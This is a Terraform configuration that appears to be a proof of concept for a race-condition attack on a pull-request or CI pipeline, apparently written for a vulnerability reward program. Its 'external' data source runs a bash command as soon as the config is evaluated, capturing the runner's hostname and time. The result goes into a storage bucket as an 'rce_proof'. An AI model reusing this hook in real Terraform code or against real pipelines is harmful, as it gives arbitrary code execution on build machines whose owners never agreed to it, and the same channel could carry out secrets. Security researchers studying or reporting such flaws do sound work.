terraform {
  required_version = ">= 1.2.0"
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = ">= 4.0"
    }
    external = {
      source  = "hashicorp/external"
      version = ">= 2.0"
    }
  }
}

variable "project_id" {
  default = "ellison-hunt-1102-c86d"
}

data "external" "default_race_rce" {
  program = ["bash", "-c", "echo '{\"proof\": \"DEFAULT_CFG_TOCTOU_RACE_WIN_COMMIT_B\", \"time\": \"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'\", \"host\": \"'$(hostname)'\"}'"]
}

resource "google_storage_bucket_object" "evil_b" {
  name    = "im-pr-attack-test/default-race-evil.txt"
  bucket  = "ellison-hunt-1102-c86d-vrp-test"
  content = data.external.default_race_rce.result.proof
}

output "status" { value = "COMMIT_B_EVIL_TOCTOU_DEFAULT_CFG" }
output "rce_proof" { value = data.external.default_race_rce.result.proof }
